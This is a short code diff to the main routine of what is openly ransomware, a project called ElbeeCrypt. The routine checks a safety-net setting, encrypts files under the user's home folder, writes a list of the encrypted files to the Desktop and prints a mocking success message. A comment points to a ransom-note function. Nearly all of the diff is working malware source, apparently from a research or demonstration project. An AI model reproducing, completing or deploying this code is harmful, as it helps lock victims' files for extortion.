@@ -43,13 +43,9 @@ void writeTo(fs::path path, std::string content){
 }
 
 /** 
- * Main entrypoint for ElbeeCrypt's cryptor binary. 
- * 
- * @param argc The number of arguments
- * @param argv The arguments themselves
- * @return The status code on conclusion of execution
+ * Main entrypoint for ElbeeCrypt's cryptor binary.
  */
-int main(int argc, char **argv){
+int main(){
 	//Deploy the safety net before continuing
 	if(common::Settings::SAFETY_NET == true){
 		if(!cryptor::Main::safetyNet()) exit(-1);
@@ -68,6 +64,9 @@ int main(int argc, char **argv){
 	std::cout << "Encryption routines started!" << std::endl;
 	std::vector<fs::path> successfullyEncrypted = cryptor::Main::encrypt(homeFolder, roots, cryptorEngine);
 
+	//If nothing was encrypted, simply exit
+	if(successfullyEncrypted.size() < 1) return -1;
+
 	//Get the parent paths of the encrypted files
 	std::vector<fs::path> parentPaths = common::utils::FS::getParents(successfullyEncrypted);
 
@@ -80,6 +79,10 @@ int main(int argc, char **argv){
 
 	//Write the list of encrypted files to the user's desktop
 	common::utils::Stream::writeToFile(homeFolder / "Desktop" / common::Settings::ENCRYPTED_FILES_LIST_NAME, successfullyEncrypted);
+
+	//Final words
+	std::cout << std::endl << "Your files have been encrypted! Have a secure day :)" << std::endl;
+	return 0;
 }
 
 /** Impl of dropRansomNote(vector, CryptorEngine, vector, vector, path). */
